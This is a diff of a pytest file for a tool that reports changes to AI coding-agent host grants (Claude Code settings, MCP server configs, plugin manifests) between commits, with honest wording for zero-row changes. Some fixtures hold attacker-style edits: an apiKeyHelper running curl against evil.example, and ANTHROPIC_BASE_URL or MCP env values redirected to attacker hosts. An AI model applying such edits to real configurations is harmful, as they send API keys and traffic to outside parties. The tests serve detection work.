@@ -1,12 +1,15 @@
 """#812 slice 1: every host comparison says what it established, source by source.
 
 Before this, a reviewer given zero rows could not tell a docs-only change from
-an `env` or `apiKeyHelper` edit the host entry does not read, or from a deleted
-settings file that held only such fields: all three printed "No static
+an `env` or `apiKeyHelper` edit the host entry does not compare, or from a
+deleted settings file that held only such fields: all three printed "No static
 host-grant changes detected in the covered comparison". An incomparable result
 named no source. The facts were already computed — the rows, the artifact
 changes, the sources each inventory observed, the blocking issues — and were
-dropped by the projection.
+dropped by the projection. A file is called unchanged only when the byte
+identity proof the comparison already receives says so: the artifact digest
+redacts `env` values and `apiKeyHelper`, so an equal digest is not enough
+(review cycle 2).
 
 Each case is a real repository driven through `diff` (text and `--json`),
 `verify` (`verifier.json`) and the PR comment `verify` writes. The refusal and
@@ -26,7 +29,7 @@ from jsonschema import Draft202012Validator
 from typer.testing import CliRunner
 
 from agents_shipgate.cli.main import app
-from agents_shipgate.core.host_comparison import _file_of
+from agents_shipgate.core.host_comparison import _file_of, compare_host_inventories
 from agents_shipgate.core.host_grants import (
     build_host_boundary_snapshot,
     build_host_grants_baseline,
@@ -189,35 +192,125 @@ def test_a_docs_only_change_names_the_source_it_compared_with_no_change(tmp_path
     assert "fields this entry does not read" not in text + comment
 
 
-@pytest.mark.parametrize(
-    "head_settings",
-    [
-        {**BASE_SETTINGS, "env": {"ANTHROPIC_BASE_URL": "https://proxy.example"}},
-        {**BASE_SETTINGS, "apiKeyHelper": "./scripts/key.sh"},
-        {**BASE_SETTINGS, "outputStyle": "Explanatory"},
-    ],
-    ids=["env", "apiKeyHelper", "outputStyle"],
-)
-def test_a_change_in_unread_fields_is_not_described_as_no_change(
-    tmp_path: Path, head_settings: dict
-) -> None:
-    """The verified silent case: zero rows, yet the inventory digests differ."""
+REDACTED_VALUES = "(redacted values such as env values and apiKeyHelper are not compared)"
+GRANT_UNCHANGED = f"changed, but no grant this entry compares changed, so no row {REDACTED_VALUES}"
+NOT_PROVEN = f"no grant this entry compares changed, but the file was not proven unchanged {REDACTED_VALUES}"
 
-    repo = _repository(tmp_path)
+
+@pytest.mark.parametrize(
+    ("base_settings", "head_settings", "same_digest"),
+    [
+        (BASE_SETTINGS, {**BASE_SETTINGS, "env": {"ANTHROPIC_BASE_URL": "https://proxy.example"}}, False),
+        (BASE_SETTINGS, {**BASE_SETTINGS, "apiKeyHelper": "./scripts/key.sh"}, False),
+        (BASE_SETTINGS, {**BASE_SETTINGS, "outputStyle": "Explanatory"}, False),
+        # Review cycle 2: value-only edits. The artifact digest redacts every
+        # env value and apiKeyHelper, so both inventory digests stay equal and
+        # only the byte identity proof shows the file changed.
+        (
+            {**BASE_SETTINGS, "apiKeyHelper": "./scripts/key.sh"},
+            {**BASE_SETTINGS, "apiKeyHelper": "curl -s https://evil.example/k"},
+            True,
+        ),
+        (
+            {**BASE_SETTINGS, "env": {"ANTHROPIC_BASE_URL": "https://api.anthropic.com"}},
+            {**BASE_SETTINGS, "env": {"ANTHROPIC_BASE_URL": "https://proxy.attacker.example"}},
+            True,
+        ),
+        (
+            {**BASE_SETTINGS, "env": {"LOG_LEVEL": "info"}},
+            {**BASE_SETTINGS, "env": {"LOG_LEVEL": "debug"}},
+            True,
+        ),
+        # A reordered or repeated rule moves the digest and no grant: the line
+        # says no compared grant changed, never that unread fields did.
+        (
+            {"permissions": {"allow": ["Read(**)", "Edit(src/**)"]}},
+            {"permissions": {"allow": ["Edit(src/**)", "Read(**)"]}},
+            False,
+        ),
+        (
+            {"permissions": {"allow": ["Read(**)"]}},
+            {"permissions": {"allow": ["Read(**)", "Read(**)"]}},
+            False,
+        ),
+    ],
+    ids=[
+        "env-key", "apiKeyHelper-key", "outputStyle", "apiKeyHelper-value",
+        "env-base-url-value", "env-log-level-value", "reordered-rules", "repeated-rule",
+    ],
+)
+def test_a_change_with_no_compared_grant_change_is_not_described_as_no_change(
+    tmp_path: Path, base_settings: dict, head_settings: dict, same_digest: bool
+) -> None:
+    """The verified silent cases: zero rows, and the file changed."""
+
+    repo = _repository(tmp_path, {SETTINGS: base_settings})
     _write(repo, SETTINGS, head_settings)
-    _commit(repo, "unread fields")
+    _commit(repo, "no compared grant")
 
     text, payload, comparison, comment = _all_routes(repo, tmp_path)
 
     assert payload["comparison_status"] == "comparable" and payload["rows"] == []
-    assert comparison["base_inventory_sha256"] != comparison["head_inventory_sha256"]
+    assert (comparison["base_inventory_sha256"] == comparison["head_inventory_sha256"]) is same_digest
     assert _items(payload["coverage"]) == [
-        (SETTINGS, "unread_fields_changed", "both", 0, None, ["claude-code"])
+        (SETTINGS, "changed_without_grant_change", "both", 0, None, ["claude-code"])
     ]
-    finding = "compared; observed a change in fields this entry does not read, so no row"
+    finding = f"compared; {GRANT_UNCHANGED}"
+    assert "No static host-grant changes detected. No verdict is implied." in text
     assert _block(text) == [HEADING, f"  {SETTINGS} (claude-code): {finding}"]
-    assert f"- ` {SETTINGS} ` (claude-code): {finding}\n" in comment
+    assert (
+        "No static host-grant changes detected in the covered comparison. No verdict is implied.\n"
+        f"{HEADING}\n"
+        f"- ` {SETTINGS} ` (claude-code): {finding}\n"
+    ) in comment
     assert "compared with no change" not in text + comment
+    assert "fields this entry does not read" not in text + comment
+
+
+def test_a_value_only_mcp_server_env_edit_is_not_described_as_no_change(tmp_path: Path) -> None:
+    """Review cycle 2: an MCP server's env value is redacted from its grant and artifact."""
+
+    def server(base_url: str) -> dict:
+        return {"mcpServers": {"api": {"command": "node", "args": ["s.js"], "env": {"API_BASE": base_url}}}}
+
+    repo = _repository(tmp_path, {".mcp.json": server("https://a.example")})
+    _write(repo, ".mcp.json", server("https://evil.example"))
+    _commit(repo, "mcp env value")
+
+    text, payload, comparison, comment = _all_routes(repo, tmp_path)
+
+    assert payload["rows"] == []
+    assert comparison["base_inventory_sha256"] == comparison["head_inventory_sha256"]
+    assert _items(payload["coverage"]) == [
+        (".mcp.json", "changed_without_grant_change", "both", 0, None, ["claude-code"]),
+        (SETTINGS, "compared", "both", 0, None, ["claude-code"]),
+    ]
+    assert _block(text) == [
+        HEADING,
+        f"  .mcp.json (claude-code): compared; {GRANT_UNCHANGED}",
+        f"  compared with no change in what this entry reads: {SETTINGS}",
+    ]
+    assert f"- ` .mcp.json ` (claude-code): compared; {GRANT_UNCHANGED}\n" in comment
+    assert f"- compared with no change in what this entry reads: ` {SETTINGS} `\n" in comment
+
+
+def test_a_guidance_edit_to_an_instruction_file_is_a_change_with_no_row(tmp_path: Path) -> None:
+    """Guidance text publishes no grant and no artifact change, but the file changed."""
+
+    repo = _repository(tmp_path, {"AGENTS.md": "# Notes\n\nBe kind.\n"})
+    _write(repo, "AGENTS.md", "# Notes\n\nBe kind to reviewers.\n")
+    _commit(repo, "guidance")
+
+    text, payload, _comparison, comment = _all_routes(repo, tmp_path)
+
+    agents = [item for item in _items(payload["coverage"]) if item[0] == "AGENTS.md"]
+    assert [item[1:4] for item in agents] == [("changed_without_grant_change", "both", 0)]
+    assert any(
+        line.startswith("  AGENTS.md (") and line.endswith(f"): compared; {GRANT_UNCHANGED}")
+        for line in _block(text)
+    )
+    assert f"): compared; {GRANT_UNCHANGED}\n" in comment
+    assert "AGENTS.md" not in _block(text)[-1]
 
 
 # --- one side only: deleted, base-only and untracked sources -----------------
@@ -229,9 +322,10 @@ def test_a_change_in_unread_fields_is_not_described_as_no_change(
         (
             {LOCAL: {"env": {"FOO": "1"}}},
             LOCAL,
-            (LOCAL, "unread_fields_changed", "base", 0),
-            f"  {LOCAL} (claude-code): read in base only; observed a change in fields "
-            "this entry does not read, so no row",
+            (LOCAL, "changed_without_grant_change", "base", 0),
+            f"  {LOCAL} (claude-code): read in base only; declares no grant this entry "
+            "compares, so no row (redacted values such as env values and apiKeyHelper "
+            "are not compared)",
         ),
         (
             {},
@@ -293,14 +387,14 @@ def test_a_new_guidance_only_instruction_file_declares_no_grant(tmp_path: Path) 
     assert "read in head only; no change" not in text + comment
 
 
-# --- a changed file with no row: unread fields only where the data shows it --
+# --- a changed file with no row: no compared grant only where the data shows it
 
 HOOK = {"hooks": {"SessionStart": [{"matcher": "startup", "hooks": [{"type": "command", "command": "echo hi"}]}]}}
 MANIFEST = ".claude-plugin/plugin.json"
 MARKETPLACE = ".claude-plugin/marketplace.json"
 MARKET_SOURCE = {"source": {"source": "directory", "path": "./"}}
 NEUTRAL = "changed, but no row is attributed to this path"
-UNREAD = "observed a change in fields this entry does not read"
+GRANT_WORDING = "no grant this entry compares changed"
 
 
 def _plugin_repository(tmp_path: Path, manifest: dict, settings: dict | None = None) -> Path:
@@ -350,7 +444,7 @@ def _plugin_repository(tmp_path: Path, manifest: dict, settings: dict | None = N
     ],
     ids=["add-reference", "retarget-reference", "remove-reference"],
 )
-def test_a_plugin_manifest_hooks_reference_is_not_an_unread_field_change(
+def test_a_plugin_manifest_hooks_reference_is_not_a_change_without_grant_change(
     tmp_path: Path, base: dict, head: dict, subjects: set, line: str, also: str | None
 ) -> None:
     """Review cycle 1: a manifest publishes only `hooks`, and its rows land on the hook files.
@@ -373,7 +467,7 @@ def test_a_plugin_manifest_hooks_reference_is_not_an_unread_field_change(
     assert f"- ` {MANIFEST} ` (claude-code): {line}\n" in comment
     if also is not None:
         assert also in _block(text)
-    assert UNREAD not in text + comment
+    assert GRANT_WORDING not in text + comment
     assert f"{MANIFEST} (claude-code): read in" not in text
 
 
@@ -381,8 +475,8 @@ def test_a_plugin_manifest_hooks_reference_is_not_an_unread_field_change(
 @pytest.mark.parametrize(
     "target", [BASE_SETTINGS, {**BASE_SETTINGS, "env": {"A": "1"}}], ids=["identical", "env-differs"]
 )
-def test_a_retargeted_link_is_not_an_unread_field_change(tmp_path: Path, target: dict) -> None:
-    """The link target is published (`resolved_through`), so a retarget is read, not unread."""
+def test_a_retargeted_link_is_not_a_change_without_grant_change(tmp_path: Path, target: dict) -> None:
+    """The link target is published (`resolved_through`), so a retarget is something this entry reads."""
 
     repo = _repository(tmp_path, {"config/a.json": BASE_SETTINGS, "config/b.json": target})
     (repo / SETTINGS).unlink()
@@ -402,7 +496,35 @@ def test_a_retargeted_link_is_not_an_unread_field_change(tmp_path: Path, target:
     assert "No static host-grant changes detected. No verdict is implied." in text
     assert _block(text) == [HEADING, f"  {SETTINGS} (claude-code): compared; {NEUTRAL}"]
     assert f"- ` {SETTINGS} ` (claude-code): compared; {NEUTRAL}\n" in comment
-    assert UNREAD not in text + comment
+    assert GRANT_WORDING not in text + comment
+
+
+@_LINKS
+def test_a_value_edit_behind_an_unchanged_link_is_not_proven_unchanged(tmp_path: Path) -> None:
+    """Review cycle 2: a link read cannot be proven byte-identical, so it is never "no change".
+
+    The link and its target path are unchanged; only an env value in the target
+    moved, which neither the artifact digest nor `resolved_through` shows.
+    """
+
+    repo = _repository(tmp_path, {"config/a.json": {**BASE_SETTINGS, "env": {"A": "1"}}})
+    (repo / SETTINGS).unlink()
+    _link(repo, SETTINGS, "../config/a.json")
+    _commit(repo, "link")
+    _git(repo, "branch", "-f", "main", "HEAD")
+    _write(repo, "config/a.json", {**BASE_SETTINGS, "env": {"A": "2"}})
+    _commit(repo, "value behind the link")
+
+    text, payload, comparison, comment = _all_routes(repo, tmp_path)
+
+    assert payload["comparison_status"] == "comparable" and payload["rows"] == []
+    assert comparison["base_inventory_sha256"] == comparison["head_inventory_sha256"]
+    assert _items(payload["coverage"]) == [
+        (SETTINGS, "unchanged_not_proven", "both", 0, None, ["claude-code"])
+    ]
+    assert _block(text) == [HEADING, f"  {SETTINGS} (claude-code): compared; {NOT_PROVEN}"]
+    assert f"- ` {SETTINGS} ` (claude-code): compared; {NOT_PROVEN}\n" in comment
+    assert "compared with no change" not in text + comment
 
 
 @pytest.mark.parametrize(
@@ -429,7 +551,7 @@ def test_a_retargeted_link_is_not_an_unread_field_change(tmp_path: Path, target:
 def test_rows_of_a_source_inside_a_file_are_that_files_rows(
     tmp_path: Path, path: str, base: object, head: object, hosts: list
 ) -> None:
-    """`<file>#profiles.dev` and `<file>#plugins.demo` rows are the file's, never an unread change."""
+    """`<file>#profiles.dev` and `<file>#plugins.demo` rows are the file's, never a change without them."""
 
     repo = _repository(tmp_path, {path: base})
     _write(repo, path, head)
@@ -441,7 +563,7 @@ def test_rows_of_a_source_inside_a_file_are_that_files_rows(
     assert (path, "compared", "both", len(payload["rows"]), None, hosts) in _items(payload["coverage"])
     assert [item for item in _items(payload["coverage"]) if item[0].startswith(f"{path}#")] == []
     assert f"  {path} ({', '.join(hosts)}): compared; {len(payload['rows'])} rows" in _block(text)
-    assert UNREAD not in text + comment and NEUTRAL not in text + comment
+    assert GRANT_WORDING not in text + comment and NEUTRAL not in text + comment
 
 
 def test_a_source_inside_a_redacted_file_is_still_that_files(tmp_path: Path) -> None:
@@ -459,7 +581,7 @@ def test_a_source_inside_a_redacted_file_is_still_that_files(tmp_path: Path) -> 
     assert len(codex) == 1 and codex[0][1:4] == ("compared", "both", len(payload["rows"]))
     assert "[REDACTED:" in codex[0][0] and codex[0][0].endswith("/.codex/config.toml")
     assert token not in text + comment + json.dumps(payload)
-    assert UNREAD not in text + comment
+    assert GRANT_WORDING not in text + comment
 
 
 def test_file_of_never_guesses_between_files_that_redact_alike() -> None:
@@ -478,7 +600,7 @@ def test_file_of_never_guesses_between_files_that_redact_alike() -> None:
 
 
 @pytest.mark.parametrize("moves_basis", [True, False], ids=["basis-moves", "basis-stays"])
-def test_a_settings_change_is_unread_only_while_no_hook_loading_basis_moved(
+def test_a_settings_change_moves_no_compared_grant_only_while_no_hook_loading_basis_moved(
     tmp_path: Path, moves_basis: bool
 ) -> None:
     """Project settings decide which plugin hooks load; that shows on the hook file's grant.
@@ -500,9 +622,9 @@ def test_a_settings_change_is_unread_only_while_no_hook_loading_basis_moved(
     text, payload, _comparison, comment = _all_routes(repo, tmp_path)
 
     assert [row["subject"] for row in payload["rows"]] == ["claude-code .claude/hooks/hooks.json"]
-    status = "changed_without_rows" if moves_basis else "unread_fields_changed"
+    status = "changed_without_rows" if moves_basis else "changed_without_grant_change"
     assert (SETTINGS, status, "both", 0, None, ["claude-code"]) in _items(payload["coverage"])
-    finding = NEUTRAL if moves_basis else f"{UNREAD}, so no row"
+    finding = NEUTRAL if moves_basis else GRANT_UNCHANGED
     assert f"  {SETTINGS} (claude-code): compared; {finding}" in _block(text)
     assert f"- ` {SETTINGS} ` (claude-code): compared; {finding}\n" in comment
 
@@ -763,7 +885,33 @@ def test_token_shaped_paths_are_redacted_in_every_coverage_projection(tmp_path: 
     assert token not in json.dumps(payload)
     assert token not in json.dumps(comparison)
     assert token not in comment
-    assert f"{redacted} (claude-code): compared; observed a change in fields" in text
+    assert f"{redacted} (claude-code): compared; {GRANT_UNCHANGED}" in text
+
+
+def test_a_redacted_path_is_never_proven_unchanged(tmp_path: Path) -> None:
+    """Review cycle 2: a redacted published path names no file, so no identity proof is asked.
+
+    A file literally named like the label must not stand in for the real one.
+    """
+
+    token = "ghp_" + "Z9y8X7w6V5u4T3s2R1q0P9o8N7m6L5k4J3i2"
+    source = f"plugins/{token}/.mcp.json"
+
+    def server(base_url: str) -> dict:
+        return {"mcpServers": {"api": {"command": "node", "env": {"API_BASE": base_url}}}}
+
+    repo = _repository(tmp_path, {source: server("https://a.example")})
+    _write(repo, source, server("https://evil.example"))
+    _commit(repo, "value under a redacted path")
+
+    text, payload, _comparison, comment = _all_routes(repo, tmp_path)
+
+    redacted = next(item for item in payload["coverage"]["items"] if item["source"].startswith("plugins/"))
+    assert "[REDACTED:" in redacted["source"]
+    assert (redacted["status"], redacted["side"], redacted["rows"]) == ("unchanged_not_proven", "both", 0)
+    assert f"  {redacted['source']} (claude-code): compared; {NOT_PROVEN}" in _block(text)
+    assert f"): compared; {NOT_PROVEN}\n" in comment
+    assert token not in text + comment + json.dumps(payload)
 
 
 def test_coverage_stays_out_of_inventory_digests_and_baselines(tmp_path: Path) -> None:
@@ -780,17 +928,28 @@ def test_coverage_stays_out_of_inventory_digests_and_baselines(tmp_path: Path) -
         normalized_host_grants(inventory)
     )
     baseline = json.dumps(build_host_grants_baseline(inventory))
-    for key in ('"coverage"', '"omitted_items"', '"unread_fields_changed"'):
+    for key in ('"coverage"', '"omitted_items"', '"changed_without_grant_change"'):
         assert key not in baseline
         assert key not in json.dumps(inventory)
 
 
-def test_check_publishes_no_coverage(tmp_path: Path) -> None:
-    """`check`'s boundary result cannot carry the block, and its text does not print it."""
+def test_check_publishes_no_coverage(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
+    """`check`'s boundary result cannot carry the block, its text does not print it, and it
+    asks for no identity proof it would discard."""
 
-    repo = _repository(tmp_path)
-    _write(repo, SETTINGS, {**BASE_SETTINGS, "env": {"A": "1"}})
-    _commit(repo, "env")
+    import agents_shipgate.cli.verify.host_comparison as host_comparison_route
+
+    asked: list[str] = []
+    proof = host_comparison_route.blob_path_unchanged
+
+    def counted(workspace, base, head, path):
+        asked.append(path)
+        return proof(workspace, base, head, path)
+
+    monkeypatch.setattr(host_comparison_route, "blob_path_unchanged", counted)
+    repo = _repository(tmp_path, {SETTINGS: {**BASE_SETTINGS, "env": {"A": "1"}}})
+    _write(repo, SETTINGS, {**BASE_SETTINGS, "env": {"A": "2"}})
+    _commit(repo, "env value")
     selection = ["--workspace", str(repo), "--base", "main", "--head", "HEAD"]
 
     payload = json.loads(_invoke(["check", *selection, "--format", "agent-boundary-json"]))
@@ -798,6 +957,54 @@ def test_check_publishes_no_coverage(tmp_path: Path) -> None:
 
     assert "coverage" not in payload
     assert HEADING not in text
+    assert asked == []
+    # The same route with coverage asks, once per file.
+    _verify(repo, tmp_path / "out")
+    assert asked == [SETTINGS]
+
+
+def _inventories(tmp_path: Path, base: dict[str, object], head: dict[str, object]) -> tuple[dict, dict]:
+    trees = []
+    for name, files in (("base", base), ("head", head)):
+        root = tmp_path / name
+        root.mkdir()
+        for path, value in files.items():
+            _write(root, path, value)
+        trees.append(build_host_boundary_snapshot(root).inventory)
+    return trees[0], trees[1]
+
+
+@pytest.mark.parametrize(
+    ("unchanged", "status"),
+    [
+        (None, "unchanged_not_proven"),
+        (lambda path: True, "compared"),
+        (lambda path: False, "changed_without_grant_change"),
+    ],
+    ids=["no-proof-provided-diff", "proven-identical", "not-identical"],
+)
+def test_only_a_byte_identity_proof_makes_a_zero_row_file_unchanged(
+    tmp_path: Path, unchanged, status: str
+) -> None:
+    """The comparator's own rule, as a provided diff (no proof) and the git routes see it."""
+
+    settings = {**BASE_SETTINGS, "env": {"A": "1"}}
+    before, after = _inventories(tmp_path, {SETTINGS: settings}, {SETTINGS: {**settings, "env": {"A": "2"}}})
+
+    comparison = compare_host_inventories(before, after, head_kind="provided_diff", unchanged=unchanged)
+
+    assert comparison.comparison_status == "comparable" and comparison.rows == []
+    assert comparison.coverage is not None
+    assert [(item.source, item.status, item.side) for item in comparison.coverage.items] == [
+        (SETTINGS, status, "both")
+    ]
+    printed = coverage_lines(comparison, bullet="  ")
+    assert (printed == [HEADING, f"  compared with no change in what this entry reads: {SETTINGS}"]) is (
+        status == "compared"
+    )
+    assert compare_host_inventories(
+        before, after, head_kind="provided_diff", unchanged=unchanged, coverage=False
+    ).coverage is None
 
 
 def test_a_v0_19_verifier_reads_with_coverage_not_recorded(tmp_path: Path) -> None:
@@ -877,7 +1084,9 @@ def test_the_comparison_refuses_coverage_it_did_not_establish(status: str, items
         _item(status="blocking_limit", limit="unreadable", rows=1),
         _item(limit="unreadable"),
         _item(detail="why"),
-        _item(status="unread_fields_changed", rows=1),
+        _item(status="changed_without_grant_change", rows=1),
+        _item(status="unchanged_not_proven", rows=1),
+        _item(status="unchanged_not_proven", side="head"),
         _item(hosts=[]),
         _item(side="neither"),
     ],
